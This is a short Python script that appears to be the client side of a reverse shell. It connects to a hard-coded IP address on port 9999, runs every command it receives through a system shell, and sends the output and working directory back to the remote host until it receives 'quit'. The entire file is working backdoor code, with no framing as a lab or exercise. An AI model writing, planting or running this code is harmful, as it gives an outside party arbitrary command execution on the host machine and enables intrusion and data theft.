import os
import socket
import subprocess

s= socket.socket()
host = '192.168.29.159'
port = 9999

s.connect((host, port))
while True:
    data = s.recv(1024)
    if data.decode("utf-8") == 'quit':
        break
    if len(data) > 0:
        cmd = data.decode("utf-8")
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = proc.stdout.read() + proc.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))